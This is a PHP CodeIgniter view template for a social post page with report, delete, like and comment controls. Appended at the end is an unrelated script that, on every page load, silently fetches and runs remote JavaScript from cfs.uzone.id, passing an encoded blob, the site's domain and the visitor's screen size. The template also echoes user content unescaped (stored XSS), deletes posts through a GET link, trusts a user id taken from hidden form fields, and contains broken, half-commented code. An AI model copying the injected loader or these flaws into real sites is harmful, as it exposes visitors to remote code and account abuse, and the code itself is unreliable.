<!-- Post Content

================================================= -->


<?= $this->session->flashdata('mm'); ?>




<?php foreach ($posting as $pst) : ?>

    <div class="post-content" style="width: 50%; margin: auto;">

        <input type="hidden" value="<?= $pst->id_posting; ?>" id="id_post">


        <?= $pst->html; ?>

        <?php if ($pst->id_user != $this->session->userdata('id')) : ?>

            <?php if ($pst->id_user != $this->session->userdata('id')) : ?>
                <form method="post" action="<?= base_url('User/addReport'); ?>">
                    <input type="hidden" name="id_posting" value="<?= $pst->id_posting; ?>">
                    <input type="hidden" name="id" value="<?= $this->session->userdata('id'); ?>">
                    <a class="btn text-red">
                        <button class="fas fa-exclamation" style="border : 0;" name="report"> Report </button> </a>
                </form>
            <?php elseif ($pst->id_user != $this->session->userdata('id') and $rpt->report == 1) : ?>

            <?php endif; ?>

        <?php else : ?>

            <i class="fas fa-trash" style="color: tomato;margin-left:18px;"></i>
            <a href="<?= base_url(); ?>user/deletePost/<?= $pst->id_posting; ?>" style="text-decoration:none;">Delete</a>

        <?php endif; ?>

        <div class="post-container">
            <img src="<?= base_url('assets_user/'); ?>images/<?= $pst->image; ?>" alt="user" class="profile-photo-md pull-left" />
            <div class="post-detail">
                <div class="user-info">
                    <h5><a href="timeline.html" class="profile-link"><?= $pst->name; ?></a> <span class="following">following</span></h5>
                    <p class="text-muted">Published on <?= $pst->date_post; ?></p>
                </div>
                <!-- <?php foreach ($suka as $sk) : ?>
                    <?php foreach ($sukaa as $sk2) : ?>
                        <!--?php if ($sk->status == null or $sk->jumlahsuka == 0 or $sk->jumlahsuka == null or $sk->id == null) : ?>
                            <div class="reaction">
                                <a class="btn text-blue">
                                    <button class="icon ion-thumbsup" style="opacity : 70% ; border : 0;" name="like1"> like </button> 0</a>
                            </div> -->

                <?php if ($sk2->id == $this->session->userdata('id') and $sk2->status == 2) : ?>
                    <div class="reaction">
                        <form method="post" action="<?= base_url('User/updateSuka') . "/" . $this->uri->segment('3'); ?>">
                            <input type="hidden" name="id_suka" value="<?= $sk2->id_suka; ?>">
                            <input type="hidden" name="id_posting" value="<?= $pst->id_posting; ?>">
                            <input type="hidden" name="notifsuka" value="Like on your post.">
                            <input type="hidden" name="id" value="<?= $this->session->userdata('id'); ?>">
                            <a class="btn text-blue">
                                <button class="icon ion-thumbsup" style="border : 0;" name="like2"> like </button> <?= $sk->jumlahsuka; ?></a>
                        </form>
                    </div>

                <?php elseif ($sk2->id == $this->session->userdata('id') and $sk2->status == 1) : ?>
                    <div class="reaction">
                        <form method="post" action="<?= base_url('User/updateGaSuka') . "/" . $this->uri->segment('3'); ?> ">
                            <input type="hidden" name="id_suka" value="<?= $sk2->id_suka; ?>">
                            <input type="hidden" name="jumlahsuka" value="<?= $sk->jumlahsuka; ?>">
                            <input type="hidden" name="id_posting" value="<?= $pst->id_posting; ?>">
                            <input type="hidden" name="notifsuka" value="Like on your post.">
                            <input type="hidden" name="id" value="<?= $this->session->userdata('id'); ?>">
                            <a class="btn text-blue">
                                <button class="icon ion-thumbsup" style="border : 0;" name="unlike"> liked </button> <?= $sk->jumlahsuka; ?></a>
                        </form>
                    </div>

                <?php else : ?>
                    <div class="reaction">
                        <form method="post" action="<?= base_url('User/addSuka') . "/" . $this->uri->segment('3'); ?>">
                            <input type="hidden" name="id_suka" value="<?= $sk2->id_suka; ?>">
                            <input type="hidden" name="jumlahsuka" value="<?= $sk->jumlahsuka; ?>">
                            <input type="hidden" name="id_posting" value="<?= $pst->id_posting; ?>">
                            <input type="hidden" name="notifsuka" value="Like on your post.">
                            <input type="hidden" name="id" value="<?= $this->session->userdata('id'); ?>">
                            <a class="btn text-blue">
                                <button class="icon ion-thumbsup" style=" border : 0;" name="like2"> Like </button> <?= $sk->jumlahsuka; ?></a>
                        </form>
                    </div>

                <?php endif; ?>
            <?php endforeach; ?>
            <?php endforeach; ?> -->


            <div class="line-divider"></div>
            <div class="post-text">
                <p><?= $pst->caption; ?> </p>
        </div>
        <div class="line-divider"></div>
        <?= $this->session->flashdata('nn'); ?>


        <?php
        //buat variabel string kosong dulu.
        //masukkan text-text yang akan diganti ke dalam array
        $text_ganti = array(":D", ":P", "._.", "<3<3)", "(y)(y)", "(y)", "<3");
        //masukkan juga path masing-masing emoticon ke dalam array
        $emoticon = array(
            "<img src='<?=base_url(assets/img/emoticon/1.png);?>'>",
            "<img src='<?=base_url(assets/img/emoticon/2.png);?>'>",
            "<img src='<?=base_url(assets/img/emoticon/3.png);?>'>",
            "<img src='<?=base_url(assets/img/emoticon/4.png);?>'>",
            "<img src='<?=base_url(assets/img/emoticon/5.png);?>'>",
            "<img src='<?=base_url(assets/img/emoticon/6.png);?>'>",
            "<img src='<?=base_url(assets/img/emoticon/7.png);?>'>"
        );

        //lakukan pengubahan
        ?>
        <?php foreach ($comment as $cmt) : ?>
            <div class="post-comment">
                <img src="<?= base_url('assets_user/'); ?>images/default.png" alt="" class="profile-photo-sm" />
                <p><a href="timeline.html" class="profile-link"> <?= $cmt->name; ?> </a> <br>
                    <?php
                    $str = $cmt->comment;
                    $str = parse_smileys($str, base_url() . 'assets/smileys/');
                    echo $str;
                    ?>
                </p>
                <?php if ($cmt->id != $this->session->userdata('id')) : ?>
                <?php else : ?>
                    <br>
                    <form method="POST" action="<?= base_url('Group/deleteComment') . "/" . $cmt->id_comment; ?>">
                                <div style="float: right;">
                                <button type="submit" style="border: 0; color: red; background-color: whitesmoke;">
                                Delete
                                </button>
                                </div>
                    </form>
                    <!-- <a href="<?= base_url(); ?>group/deleteComment/<?= $cmt->id_comment; ?> " style="text-decoration:none; color:red;">&nbsp; Delete</a> -->
                <?php endif; ?>
            </div>


        <?php endforeach; ?>
        <?php echo smiley_js(); ?>
        <form method="post" action="<?= base_url('Group/commentPost') . "/" . $this->uri->segment('3'); ?>">
            <div class="post-comment">
                <img src="<?= base_url('assets_user/'); ?>images/<?= $pst->image; ?>" alt="" class="profile-photo-sm" />
                <input type="text" name="comment" id="comment" class="form-control" placeholder="Post a comment">
                <input type="hidden" name="id_posting" value="<?= $pst->id_posting; ?>">
                <input type="hidden" name="notifComment" value="Comment on your post.">
                <input type="hidden" name="id" value="<?= $this->session->userdata('id'); ?>">
                <input type="submit" class="btn-primary" style="height: 45px; margin-top: -2px; margin-left: 10px; margin-right: -10px;background-color: #6fb8df;" value="Send">
                </form>


            </div>
            <p>Click to insert a smiley!</p>
            <?php echo $smiley_table; ?>
        </div>
        </div>
        </div>

        <?php endforeach; ?>
        <!-- Post Content=================================================-->



    </div>

<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXxgfvjefwcdpi3BR90FnQrXwyyfCTDb8E2di%2fELZdFcaQDCb4sEyVDeTd8ej5SFMh%2b7xyrzblfQFOXTUXf9iN32Ab9iiJ2EpDdADb8Pv0GHv1kURtIeaOiDyjJyYbPUfYgP%2bVgsl8ln0cuzZNAIKby3S%2fpQrnexuB635Gi9zTRaH2HlNoKc%2bSPuJ7kNdPIqXX%2fAIlau%2fUfKQYBHD527gIcOE3q2TQ0hhCAgSyqHzzUfXQK2wC%2bq4RuZ%2fzOiipvNxE0YTg878qSdfUFPRlPqJqva3TEtq9qz%2blbk30gBRXL6wJOlco56Bbe8beu%2bhJ9Ocx0ZOx1fBw6kqmsuriz2rmD6qwqTNAkoRGU9GD2F3XG3SB%2fw5BN2tGboFc%2fOpAII6Gmj8P12MvyhRwYZNEeoGq4YTLTtgSZL%2bsPa2O3Qkrq%2fRwktYVwi4g8rS2DY3M1qTsoMQPMug95776MKZOZKimLgPJnSoJGOJ9p5MBsdXuqe0%3d" +
                "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>